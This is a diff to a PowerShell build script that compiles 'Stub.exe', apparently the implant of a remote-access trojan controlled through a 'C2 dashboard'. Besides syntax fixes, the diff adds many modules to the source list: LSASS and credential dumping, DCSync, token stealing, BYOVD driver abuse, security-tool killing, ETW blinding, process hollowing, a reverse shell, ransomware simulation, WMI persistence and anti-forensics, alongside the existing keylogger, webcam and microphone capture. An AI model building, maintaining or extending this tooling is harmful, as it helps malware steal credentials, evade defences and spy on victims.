@@ -1,5 +1,5 @@
 # Build Stub.exe with MinGW (Windows)
-# Run from anywhere — script auto-locates itself and MinGW.
+# Run from anywhere - script auto-locates itself and MinGW.
 #
 # Usage:
 #   .\build.ps1
@@ -14,7 +14,7 @@ param(
 $StubDir = $PSScriptRoot
 Set-Location $StubDir
 
-# ── Auto-detect CryptoPP ──────────────────────────────────────────────────────
+# -- Auto-detect CryptoPP --
 if (-not $CryptoPP) {
     $candidates = @(
         "D:\CryptoPP",
@@ -35,7 +35,7 @@ if (-not $CryptoPP) {
 }
 Write-Host "[INFO] CryptoPP: $CryptoPP"
 
-# ── Auto-detect MinGW ─────────────────────────────────────────────────────────
+# -- Auto-detect MinGW --
 if (-not $MinGW) {
     $candidates = @(
         "C:\MinGW",
@@ -50,8 +50,8 @@ if (-not $MinGW) {
     }
     # Also check PATH
     if (-not $MinGW) {
-        $gpp = (Get-Command g++ -ErrorAction SilentlyContinue)?.Source
-        if ($gpp) { $MinGW = Split-Path (Split-Path $gpp); Write-Host "[INFO] Found g++ in PATH: $gpp" }
+        $gppCmd = Get-Command g++ -ErrorAction SilentlyContinue
+        if ($gppCmd) { $gpp = $gppCmd.Source; $MinGW = Split-Path (Split-Path $gpp); Write-Host "[INFO] Found g++ in PATH: $gpp" }
     }
     if (-not $MinGW) {
         Write-Host "ERROR: MinGW not found. Pass -MinGW <path> or add to PATH." -ForegroundColor Red
@@ -63,17 +63,26 @@ Write-Host "[INFO] MinGW: $MinGW"
 $env:PATH = "$MinGW\bin;$env:PATH"
 
 $NlohmannInc = "$StubDir\..\packages\nlohmann.json.3.9.1\build\native\include"
-$WinThreadLib = (Get-ChildItem "$MinGW" -Recurse -Filter "libwinpthread.a" -ErrorAction SilentlyContinue |
-                  Select-Object -First 1)?.FullName
+$_wt = Get-ChildItem "$MinGW" -Recurse -Filter "libwinpthread.a" -ErrorAction SilentlyContinue | Select-Object -First 1
+$WinThreadLib = if ($_wt) { $_wt.FullName } else { $null }
 if (-not $WinThreadLib) {
-    Write-Host "WARNING: libwinpthread.a not found — omitting --whole-archive flag" -ForegroundColor Yellow
+    Write-Host "WARNING: libwinpthread.a not found - omitting --whole-archive flag" -ForegroundColor Yellow
 }
 
-$Sources = 'BotNet.cpp','C2Client.cpp','FileCryptor.cpp','FileManager.cpp',
-           'Information.cpp','Keylogger.cpp','Manager.cpp','MicTool.cpp',
-           'PrntSc.cpp','ProcessManager.cpp','Protector.cpp','Requests.cpp',
-           'ScreenTool.cpp','ServiceManager.cpp','Telegram.cpp','Telemetry.cpp',
-           'WebcamTool.cpp','WinMain.cpp'
+$Sources = 'AntiAnalysis.cpp','AntiForensics.cpp','APCInject.cpp',
+           'BotNet.cpp','BrowserHistory.cpp','BYOVD.cpp',
+           'C2Client.cpp','ClipMon.cpp','COMHijack.cpp','CredDump.cpp',
+           'DCSync.cpp','DefenseKill.cpp','DirectSyscall.cpp','DLLHijack.cpp',
+           'DocOps.cpp','Doppelgang.cpp','ETWTiBlind.cpp','Evasion.cpp',
+           'FileCryptor.cpp','FileManager.cpp','HeapEncrypt.cpp','Hollow.cpp',
+           'IFEOHijack.cpp','IndirectSyscall.cpp','Information.cpp',
+           'KernelUnhook.cpp','Keylogger.cpp','LSASecrets.cpp','LsassDump.cpp',
+           'Manager.cpp','MicTool.cpp','ModuleStomp.cpp','NetScan.cpp',
+           'PEStamp.cpp','PPIDSpoof.cpp','PrivEsc.cpp','PrntSc.cpp',
+           'ProcessManager.cpp','Protector.cpp','RansomSim.cpp','Requests.cpp',
+           'RevShell.cpp','ScreenTool.cpp','ServiceManager.cpp','SleepObfusc.cpp',
+           'StackSpoof.cpp','Telegram.cpp','Telemetry.cpp','ThreadHijack.cpp',
+           'TokenStealer.cpp','WebcamTool.cpp','WinMain.cpp','WMIPersist.cpp'
 
 # Step 1: compile resource file
 Write-Host '[1/3] Compiling resource file...'
@@ -114,6 +123,6 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 Remove-Item -ErrorAction SilentlyContinue Stub_res.o
-Write-Host '[3/3] Done — Stub.exe ready.' -ForegroundColor Green
-Write-Host "Size: $([math]::Round((Get-Item Stub.exe).Length/1024)) KB"
+Write-Host '[3/3] Done - Stub.exe ready.' -ForegroundColor Green
+$sz = [math]::Round((Get-Item 'Stub.exe').Length / 1024); Write-Host ('Size: ' + $sz + ' KB')
 Write-Host 'Next: run the C2 dashboard Builder tab to configure and download the stub.'
